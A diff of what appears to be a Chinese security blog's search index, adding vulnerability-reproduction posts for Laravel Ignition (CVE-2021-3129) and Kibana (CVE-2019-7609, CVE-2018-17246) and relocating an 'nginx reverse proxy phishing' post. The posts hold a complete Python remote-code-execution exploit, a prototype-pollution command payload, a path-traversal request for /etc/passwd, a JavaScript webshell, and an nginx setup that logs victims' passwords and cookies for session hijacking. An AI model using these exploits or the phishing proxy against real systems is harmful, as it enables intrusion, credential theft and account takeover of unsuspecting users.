+    <content><![CDATA[<h1 id="Laravel-Ignition-2-5-1-代码执行漏洞（CVE-2021-3129）"><a href="#Laravel-Ignition-2-5-1-代码执行漏洞（CVE-2021-3129）" class="headerlink" title="Laravel Ignition 2.5.1 代码执行漏洞（CVE-2021-3129）"></a>Laravel Ignition 2.5.1 代码执行漏洞（CVE-2021-3129）</h1><p>Laravel是一个由Taylor Otwell所创建，免费的开源 PHP Web 框架。在开发模式下，Laravel使用了Ignition提供的错误页面，在Ignition 2.5.1及之前的版本中，有类似这样的代码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$contents &#x3D; file_get_contents($parameters[&#39;viewFile&#39;]);</span><br><span class="line">file_put_contents($parameters[&#39;viewFile&#39;], $contents);</span><br></pre></td></tr></table></figure>
+
+<p>攻击者可以通过phar://协议来执行反序列化操作，进而执行任意代码。</p>
+<a id="more"></a>
+
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Laravel 框架 &lt; 8.4.3<br>facade ignition 组件 &lt; 2.5.2</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问192.168.44.132:8080/即可看到一个Laravel默认的欢迎页面。</p>
+<p><img src="https://image.3001.net/images/20211101/163574929910.png" alt="image-20211028141746599"></p>
+<p>发送POC包，返回页面存在报错就证明存在漏洞</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;_ignition&#x2F;execute-solution HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 169</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;xxxx&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20211101/16357493023805.png" alt="image-20211028143143946"></p>
+<p>使用EXP</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests as req</span><br><span class="line">import os, uuid</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">class Exp:</span><br><span class="line">    __gadget_chains &#x3D; &#123;</span><br><span class="line">        &quot;monolog_rce1&quot;: r&quot;&quot;&quot; php -d &#39;phar.readonly&#x3D;0&#39; phpggc&#x2F;phpggc monolog&#x2F;rce1 system %s --phar phar -o php:&#x2F;&#x2F;output | base64 -w0 | python -c &quot;import sys;print(&#39;&#39;.join([&#39;&#x3D;&#39; + hex(ord(i))[2:].zfill(2) + &#39;&#x3D;00&#39; for i in sys.stdin.read()]).upper())&quot; &gt; payload.txt&quot;&quot;&quot;,</span><br><span class="line">        &quot;monolog_rce2&quot;: r&quot;&quot;&quot; php -d &#39;phar.readonly&#x3D;0&#39; phpggc&#x2F;phpggc monolog&#x2F;rce2 system %s --phar phar -o php:&#x2F;&#x2F;output | base64 -w0 | python -c &quot;import sys;print(&#39;&#39;.join([&#39;&#x3D;&#39; + hex(ord(i))[2:].zfill(2) + &#39;&#x3D;00&#39; for i in sys.stdin.read()]).upper())&quot; &gt; payload.txt&quot;&quot;&quot;,</span><br><span class="line">        &quot;monolog_rce3&quot;: r&quot;&quot;&quot; php -d &#39;phar.readonly&#x3D;0&#39; phpggc&#x2F;phpggc monolog&#x2F;rce3 system %s --phar phar -o php:&#x2F;&#x2F;output | base64 -w0 | python -c &quot;import sys;print(&#39;&#39;.join([&#39;&#x3D;&#39; + hex(ord(i))[2:].zfill(2) + &#39;&#x3D;00&#39; for i in sys.stdin.read()]).upper())&quot; &gt; payload.txt&quot;&quot;&quot;,</span><br><span class="line">    &#125;  # phpggc链集合，暂时添加rce1后续再添加其他增强通杀能力</span><br><span class="line"></span><br><span class="line">    __delimiter_len &#x3D; 8  # 定界符长度</span><br><span class="line">    </span><br><span class="line">    def __vul_check(self):</span><br><span class="line">        resp &#x3D; req.get(self.__url, verify&#x3D;False)</span><br><span class="line">        if resp.status_code !&#x3D; 405 and &quot;laravel&quot; not in resp.text:</span><br><span class="line">            return False</span><br><span class="line">        return True</span><br><span class="line">    </span><br><span class="line">    def __payload_send(self, payload):</span><br><span class="line">        header &#x3D; &#123;</span><br><span class="line">            &quot;Accept&quot;: &quot;application&#x2F;json&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        data &#x3D; &#123;</span><br><span class="line">            &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">            &quot;parameters&quot;: &#123;</span><br><span class="line">                &quot;variableName&quot;: &quot;cve20213129&quot;,</span><br><span class="line">                &quot;viewFile&quot;: &quot;&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        data[&quot;parameters&quot;][&quot;viewFile&quot;] &#x3D; payload</span><br><span class="line">        resp &#x3D; req.post(self.__url, headers&#x3D;header, json&#x3D;data, verify&#x3D;False)</span><br><span class="line">        # print(resp.text)</span><br><span class="line">        return resp</span><br><span class="line">    </span><br><span class="line">    def __command_handler(self, command):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        因为用户命令要注入到payload生成的命令中，为了防止影响结构，所以进行一些处理。</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">    </span><br><span class="line">        self.__delimiter &#x3D; str(uuid.uuid1())[:self.__delimiter_len]  # 定界符用于定位页面中命令执行结果的位置。</span><br><span class="line">        # print(delimiter)</span><br><span class="line">        command &#x3D; &quot;echo %s &amp;&amp; %s &amp;&amp; echo %s&quot; % (self.__delimiter, command, self.__delimiter)</span><br><span class="line">        # print(command)</span><br><span class="line">    </span><br><span class="line">        escaped_chars &#x3D; [&#39; &#39;, &#39;&amp;&#39;, &#39;|&#39;]  # 我只想到这么多，可自行添加。</span><br><span class="line">        for c in escaped_chars:</span><br><span class="line">            command &#x3D; command.replace(c, &#39;\\&#39; + c)</span><br><span class="line">        # print(command)</span><br><span class="line">        return command</span><br><span class="line">    </span><br><span class="line">    def __clear_log(self):</span><br><span class="line">        return self.__payload_send(</span><br><span class="line">            &quot;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.utf-8.utf-16le|convert.quoted-printable-encode|convert.iconv.utf-16le.utf-8|convert.base64-decode&#x2F;resource&#x3D;..&#x2F;storage&#x2F;logs&#x2F;laravel.log&quot;)</span><br><span class="line">    </span><br><span class="line">    def __gen_payload(self, gadget_chain):</span><br><span class="line">        gen_shell &#x3D; self.__gadget_chains[gadget_chain] % (self.__command)</span><br><span class="line">        # print(gen_shell)</span><br><span class="line">        os.system(gen_shell)</span><br><span class="line">        with open(&#39;payload.txt&#39;, &#39;r&#39;) as f:</span><br><span class="line">            payload &#x3D; f.read().replace(&#39;\n&#39;, &#39;&#39;) + &#39;a&#39;  # 添加一个字符使得两个完整的payload总是只有一个可以正常解码</span><br><span class="line">        os.system(&quot;rm payload.txt&quot;)</span><br><span class="line">        # print(payload)</span><br><span class="line">        return payload</span><br><span class="line">    </span><br><span class="line">    def __decode_log(self):</span><br><span class="line">        return self.__payload_send(</span><br><span class="line">            &quot;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode&#x2F;resource&#x3D;..&#x2F;storage&#x2F;logs&#x2F;laravel.log&quot;)</span><br><span class="line">    </span><br><span class="line">    def __unserialize_log(self):</span><br><span class="line">        return self.__payload_send(&quot;phar:&#x2F;&#x2F;..&#x2F;storage&#x2F;logs&#x2F;laravel.log&#x2F;test.txt&quot;)</span><br><span class="line">    </span><br><span class="line">    def __rce(self):</span><br><span class="line">        text &#x3D; self.__unserialize_log().text</span><br><span class="line">        # print(text)</span><br><span class="line">    </span><br><span class="line">        echo_find &#x3D; text.find(self.__delimiter)</span><br><span class="line">        # print(echo_find)</span><br><span class="line">        if echo_find &gt;&#x3D; 0:</span><br><span class="line">            return text[echo_find + self.__delimiter_len + 1: text.find(self.__delimiter, echo_find + 1)]</span><br><span class="line">        else:</span><br><span class="line">            return &quot;[-] RCE echo is not found.&quot;</span><br><span class="line">    </span><br><span class="line">    def exp(self):</span><br><span class="line">        for gadget_chain in self.__gadget_chains.keys():</span><br><span class="line">            print(&quot;[*] Try to use %s for exploitation.&quot; % (gadget_chain))</span><br><span class="line">            self.__clear_log()</span><br><span class="line">            self.__clear_log()</span><br><span class="line">            self.__payload_send(&#39;a&#39; * 2)</span><br><span class="line">            self.__payload_send(self.__gen_payload(gadget_chain))</span><br><span class="line">            self.__decode_log()</span><br><span class="line">            print(&quot;[*] Result:&quot;)</span><br><span class="line">            print(self.__rce())</span><br><span class="line">    </span><br><span class="line">    def __init__(self, target, command):</span><br><span class="line">        self.target &#x3D; target</span><br><span class="line">        self.__url &#x3D; req.compat.urljoin(target, &quot;_ignition&#x2F;execute-solution&quot;)</span><br><span class="line">        self.__command &#x3D; self.__command_handler(command)</span><br><span class="line">        if not self.__vul_check():</span><br><span class="line">            print(&quot;[-] [%s] is seems not vulnerable.&quot; % (self.target))</span><br><span class="line">            print(&quot;[*] You can also call obj.exp() to force an attack.&quot;)</span><br><span class="line">        else:</span><br><span class="line">            self.exp()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    args &#x3D; sys.argv</span><br><span class="line">    url &#x3D; args[1]</span><br><span class="line">    command &#x3D; args[2]</span><br><span class="line">    Exp(url, command)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>在同目录下下载<code>https://github.com/ambionics/phpggc.git</code></p>
+<p>运行exp</p>
+<p>python3 exp.py http:ip/ “命令执行语句”</p>
+<p><img src="https://image.3001.net/images/20211101/16357493057699.png" alt="image-20211028152123624"></p>
+<p>注意环境需要php和python3才能运行！</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Laravel</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Kibana 原型污染导致远程代码执行 (CVE-2019-7609)</title>
+    <url>/2021/10/28/Kibana%20%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%20(CVE-2019-7609)/</url>
+    <content><![CDATA[<h1 id="Kibana-原型污染导致远程代码执行-CVE-2019-7609"><a href="#Kibana-原型污染导致远程代码执行-CVE-2019-7609" class="headerlink" title="Kibana 原型污染导致远程代码执行 (CVE-2019-7609)"></a>Kibana 原型污染导致远程代码执行 (CVE-2019-7609)</h1><p>Kibana 是一个用于 Elasticsearch 的开源数据可视化仪表板。</p>
+<p>5.6.15 和 6.6.1 之前的 Kibana 版本在 Timelion 可视化器中包含任意代码执行缺陷。有权访问 Timelion 应用程序的攻击者可以发送尝试执行 javascript 代码的请求。这可能会导致攻击者在主机系统上使用 Kibana 进程的权限执行任意命令。</p>
+<p>参考：</p>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-7609" target="_blank" rel="noopener">https://nvd.nist.gov/vuln/detail/CVE-2019-7609</a></li>
+<li><a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/" target="_blank" rel="noopener">https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/</a></li>
+<li><a href="https://slides.com/securitymb/prototype-pollution-in-kibana/#/4" target="_blank" rel="noopener">https://slides.com/securitymb/prototype-pollution-in-kibana/#/4</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h2><p>在设置环境之前，需要<code>vm.max_map_count</code>在主机服务器（不是在docker容器中）更改为大于262144：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sysctl -w vm.max_map_count&#x3D;262144</span><br></pre></td></tr></table></figure>
+
+<p>然后，启动 Kibana 6.5.4 和 Elasticsearch 6.8.6：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞重现"><a href="#漏洞重现" class="headerlink" title="漏洞重现"></a>漏洞重现</h2><p>启动环境后，Kibana 正在监听<code>http://192.168.44.132:5106</code>. 原型污染发生在时间线可视化器中，请在此处填写以下有效负载：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.es(*).props(label.__proto__.env.AAAA&#x3D;&#39;require(&quot;child_process&quot;).exec(&quot;&#x2F;bin&#x2F;touch &#x2F;tmp&#x2F;success&quot;);process.exit()&#x2F;&#x2F;&#39;)</span><br><span class="line">.props(label.__proto__.env.NODE_OPTIONS&#x3D;&#39;--require &#x2F;proc&#x2F;self&#x2F;environ&#39;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20211028/16354005801572.png" alt="image-20211011173949872"></p>
+<p>然后，访问“Canvas”页面以触发命令<code>/bin/touch /tmp/success</code>。文件<code>/tmp/success</code>创建成功：</p>
+<p><img src="https://image.3001.net/images/20211028/16354005824191.png" alt="image-20211011174020437"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Kibana</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Kibana 本地文件包含 (CVE-2018-17246)</title>
+    <url>/2021/10/28/Kibana%20%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%20(CVE-2018-17246)/</url>
+    <content><![CDATA[<h1 id="Kibana-本地文件包含-CVE-2018-17246"><a href="#Kibana-本地文件包含-CVE-2018-17246" class="headerlink" title="Kibana 本地文件包含 (CVE-2018-17246)"></a>Kibana 本地文件包含 (CVE-2018-17246)</h1><p>Kibana 是一个用于 Elasticsearch 的开源数据可视化仪表板。</p>
+<p>6.4.3 和 5.6.13 之前的 Kibana 版本在控制台插件中包含任意文件包含缺陷。有权访问 Kibana 控制台 API 的攻击者可以发送尝试执行 javascript 代码的请求。这可能会导致攻击者在主机系统上使用 Kibana 进程的权限执行任意命令。</p>
+<p>参考：</p>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-17246" target="_blank" rel="noopener">https://nvd.nist.gov/vuln/detail/CVE-2018-17246</a></li>
+<li><a href="https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/" target="_blank" rel="noopener">https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>启动环境后，Kibana 正在监听<code>http://192.168.44.132:5106</code></p>
+<p>发送以下请求以触发基本路径遍历：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.44.132:5601&#x2F;api&#x2F;console&#x2F;api_server?sense_version&#x3D;%40%40SENSE_VERSION&amp;apis&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+
+<p>尽管除了带有 500 状态代码的错误消息外没有任何响应，但您可以在以下内容中看到异常<code>docker-compose logs</code>：</p>
+<p><img src="https://image.3001.net/images/20211028/16354004767659.png" alt="image-20211011164252707"></p>
+<p>文件<code>/etc/passwd</code>导入成功。</p>
+<p>要利用此漏洞，您需要将 JavaScript webshell 上传到运行 Kibana 的机器，然后将其包含在内。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; docker-compose exec kibana bash &amp;&amp; echo &#39;...code...&#39; &gt; &#x2F;tmp&#x2F;vulhub.js</span><br><span class="line">export default &#123;asJson: function() &#123;return require(&quot;child_process&quot;).execSync(&quot;id&quot;).toString()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20211028/1635400480169.png" alt="image-20211011164727468"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Kibana</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Jupyter Notebook 未授权访问漏洞</title>
     <url>/2021/08/23/Jupyter%20Notebook%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h1 id="Jupyter-Notebook-未授权访问漏洞"><a href="#Jupyter-Notebook-未授权访问漏洞" class="headerlink" title="Jupyter Notebook 未授权访问漏洞"></a>Jupyter Notebook 未授权访问漏洞</h1><p>Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。</p>
@@ -2992,6 +3372,41 @@
       </tags>
   </entry>
   <entry>
+    <title>nginx反向代理钓鱼</title>
+    <url>/2021/04/24/nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC/</url>
+    <content><![CDATA[<h1 id="nginx反向代理钓鱼"><a href="#nginx反向代理钓鱼" class="headerlink" title="nginx反向代理钓鱼"></a>nginx反向代理钓鱼</h1><h2 id="一、反向代理"><a href="#一、反向代理" class="headerlink" title="一、反向代理"></a>一、反向代理</h2><p>反向代理服务器位于用户与目标服务器之间，但是对于用户而言，反向代理服务器就相当于目标服务器，即用户直接访问反向代理服务器就可以获得目标服务器的资源。同时，用户不需要知道目标服务器的地址，也无须在用户端作任何设定。反向代理服务器通常可用来作为Web加速，即使用反向代理作为Web服务器的前置机来降低网络和服务器的负载，提高访问效率。</p>
+<p><img src="https://image.3001.net/images/20201024/16034962257029.png" alt="image-20201021042310179"></p>
+<a id="more"></a>
+
+<h2 id="二、部署配置"><a href="#二、部署配置" class="headerlink" title="二、部署配置"></a>二、部署配置</h2><h3 id="1-安装nginx"><a href="#1-安装nginx" class="headerlink" title="1.安装nginx"></a>1.安装nginx</h3><p>不做赘述，具体百度。</p>
+<h3 id="2-配置文件"><a href="#2-配置文件" class="headerlink" title="2.配置文件"></a>2.配置文件</h3><p>打开nginx的配置文件<code>/etc/nginx/nginx.conf</code>，具体虚拟主机的配置包含在另一个文件中</p>
+<p><img src="https://image.3001.net/images/20201024/160349622898.png" alt="image-20201021043958270"></p>
+<p>打开<code>/etc/nginx/conf.d/</code>文件夹，新建一个test.conf文件，做具体的信息配置。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server&#123;</span><br><span class="line">        listen  8080;</span><br><span class="line">        server_name     47.xx.xx.xx;</span><br><span class="line">        index index.html index.htm index.php;</span><br><span class="line"></span><br><span class="line">        access_log      &#x2F;var&#x2F;log&#x2F;nginx&#x2F;test.log Testlog;</span><br><span class="line">    </span><br><span class="line">        location &#x2F; &#123;</span><br><span class="line">                proxy_next_upstream http_502 http_504 error timeout invalid_header;</span><br><span class="line">                proxy_pass http:&#x2F;&#x2F;xxx.com&#x2F;;</span><br><span class="line">                proxy_set_header Host 47.xx.xx.xx;</span><br><span class="line">                proxy_set_header X-Real-Ip $remote_addr;</span><br><span class="line">                proxy_set_header X-Forwarded-For $remote_addr;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>server_name</code> 为域名，这里我用自己服务器的ip<br><code>access_log</code> 为设置输出日志的路径<br><code>proxy_next_upstream</code> 如果后端的服务器返回 502、504、执行超时等错误，自动将请求转发upstream负载均衡池中的另一台服务器，实现故障转移。<br><code>proxy_pass</code> 需要反向代理的网站<br><code>proxy_set_header</code>  用于在向反向代理的后端 Web 服务器发起请求时添加指定的 Header头信息。</p>
+<p>当后端 Web 服务器上有多个基于域名的虚拟主机时，要通过添加 Header 头信息 Host，用于指定请求的域名，这样后端 Web 服务器才能识别该反向代理访问请求由哪一个虚拟主机来处理。</p>
+<p>最后我们还需要设置以下 访问日志需要获取的内容 也是在<code>nginx.conf</code>里修改。在http模块中添加：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">log_format Testlog escape&#x3D;json &#39;$request_filename $http_x_forwarded_for $fastcgi_script_name $document_root $request_body&#39; $http_cookie;</span><br></pre></td></tr></table></figure>
+
+<p>Testlog 要和上面的<code>access_log</code>对应不然日志不会起作用。</p>
+<p>重点是<code>$request_body(获取post数据),$http_cookie(获取cookie数据)</code>这就是我们钓鱼的核心了。当有人访问并登陆我们反向代理的网站以后 我们点开日志就可以看到他的cookie和post提交的用户名和密码了。</p>
+<h2 id="三、上手实战"><a href="#三、上手实战" class="headerlink" title="三、上手实战"></a>三、上手实战</h2><p>使用某网站做上述配置进行反向代理，配置完成后访问自己服务器ip，可以看到是自己的ip，显示目标系统的界面，说明反向代理成功。</p>
+<p><img src="https://image.3001.net/images/20201024/16034962325695.png" alt="image-20201021051523406"></p>
+<p>进行登录操作后，可以在日志中看到获取的cookie</p>
+<p><img src="https://image.3001.net/images/20201024/16034962382259.png" alt="image-20201021052001089"></p>
+<p>使用cookie进行登录访问，成功进入。</p>
+<p><img src="https://image.3001.net/images/20201024/16034962359939.png" alt="image-20201021052143060"></p>
+]]></content>
+      <categories>
+        <category>钓鱼</category>
+      </categories>
+      <tags>
+        <tag>nginx</tag>
+        <tag>钓鱼</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Apache HTTPD 多后缀解析漏洞</title>
     <url>/2021/04/21/Apache%20HTTPD%20%E5%A4%9A%E5%90%8E%E7%BC%80%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h1 id="Apache-HTTPD-多后缀解析漏洞"><a href="#Apache-HTTPD-多后缀解析漏洞" class="headerlink" title="Apache HTTPD 多后缀解析漏洞"></a>Apache HTTPD 多后缀解析漏洞</h1><a id="more"></a>
@@ -3107,42 +3522,6 @@
       <tags>
         <tag>Vulhub复现</tag>
         <tag>Apache</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>nginx反向代理钓鱼</title>
-    <url>/2020/10/23/nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC/</url>
-    <content><![CDATA[<h1 id="nginx反向代理钓鱼"><a href="#nginx反向代理钓鱼" class="headerlink" title="nginx反向代理钓鱼"></a>nginx反向代理钓鱼</h1><h2 id="一、反向代理"><a href="#一、反向代理" class="headerlink" title="一、反向代理"></a>一、反向代理</h2><p>反向代理服务器位于用户与目标服务器之间，但是对于用户而言，反向代理服务器就相当于目标服务器，即用户直接访问反向代理服务器就可以获得目标服务器的资源。同时，用户不需要知道目标服务器的地址，也无须在用户端作任何设定。反向代理服务器通常可用来作为Web加速，即使用反向代理作为Web服务器的前置机来降低网络和服务器的负载，提高访问效率。</p>
-<p><img src="https://image.3001.net/images/20201024/16034962257029.png" alt="image-20201021042310179"></p>
-<a id="more"></a>
-
-<h2 id="二、部署配置"><a href="#二、部署配置" class="headerlink" title="二、部署配置"></a>二、部署配置</h2><h3 id="1-安装nginx"><a href="#1-安装nginx" class="headerlink" title="1.安装nginx"></a>1.安装nginx</h3><p>不做赘述，具体百度。</p>
-<h3 id="2-配置文件"><a href="#2-配置文件" class="headerlink" title="2.配置文件"></a>2.配置文件</h3><p>打开nginx的配置文件<code>/etc/nginx/nginx.conf</code>，具体虚拟主机的配置包含在另一个文件中</p>
-<p><img src="https://image.3001.net/images/20201024/160349622898.png" alt="image-20201021043958270"></p>
-<p>打开<code>/etc/nginx/conf.d/</code>文件夹，新建一个test.conf文件，做具体的信息配置。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server&#123;</span><br><span class="line">        listen  8080;</span><br><span class="line">        server_name     47.xx.xx.xx;</span><br><span class="line">        index index.html index.htm index.php;</span><br><span class="line"></span><br><span class="line">        access_log      &#x2F;var&#x2F;log&#x2F;nginx&#x2F;test.log Testlog;</span><br><span class="line">    </span><br><span class="line">        location &#x2F; &#123;</span><br><span class="line">                proxy_next_upstream http_502 http_504 error timeout invalid_header;</span><br><span class="line">                proxy_pass http:&#x2F;&#x2F;xxx.com&#x2F;;</span><br><span class="line">                proxy_set_header Host 47.xx.xx.xx;</span><br><span class="line">                proxy_set_header X-Real-Ip $remote_addr;</span><br><span class="line">                proxy_set_header X-Forwarded-For $remote_addr;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>server_name</code> 为域名，这里我用自己服务器的ip<br><code>access_log</code> 为设置输出日志的路径<br><code>proxy_next_upstream</code> 如果后端的服务器返回 502、504、执行超时等错误，自动将请求转发upstream负载均衡池中的另一台服务器，实现故障转移。<br><code>proxy_pass</code> 需要反向代理的网站<br><code>proxy_set_header</code>  用于在向反向代理的后端 Web 服务器发起请求时添加指定的 Header头信息。</p>
-<p>当后端 Web 服务器上有多个基于域名的虚拟主机时，要通过添加 Header 头信息 Host，用于指定请求的域名，这样后端 Web 服务器才能识别该反向代理访问请求由哪一个虚拟主机来处理。</p>
-<p>最后我们还需要设置以下 访问日志需要获取的内容 也是在<code>nginx.conf</code>里修改。在http模块中添加：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">log_format Testlog escape&#x3D;json &#39;$request_filename $http_x_forwarded_for $fastcgi_script_name $document_root $request_body&#39; $http_cookie;</span><br></pre></td></tr></table></figure>
-
-<p>Testlog 要和上面的<code>access_log</code>对应不然日志不会起作用。</p>
-<p>重点是<code>$request_body(获取post数据),$http_cookie(获取cookie数据)</code>这就是我们钓鱼的核心了。当有人访问并登陆我们反向代理的网站以后 我们点开日志就可以看到他的cookie和post提交的用户名和密码了。</p>
-<h2 id="三、上手实战"><a href="#三、上手实战" class="headerlink" title="三、上手实战"></a>三、上手实战</h2><p>使用某网站做上述配置进行反向代理，配置完成后访问自己服务器ip，可以看到是自己的ip，显示目标系统的界面，说明反向代理成功。</p>
-<p><img src="https://image.3001.net/images/20201024/16034962325695.png" alt="image-20201021051523406"></p>
-<p>进行登录操作后，可以在日志中看到获取的cookie</p>
-<p><img src="https://image.3001.net/images/20201024/16034962382259.png" alt="image-20201021052001089"></p>
-<p>使用cookie进行登录访问，成功进入。</p>
-<p><img src="https://image.3001.net/images/20201024/16034962359939.png" alt="image-20201021052143060"></p>
-]]></content>
-      <categories>
-        <category>钓鱼</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>nginx</tag>
-        <tag>钓鱼</tag>
       </tags>
   </entry>
   <entry>
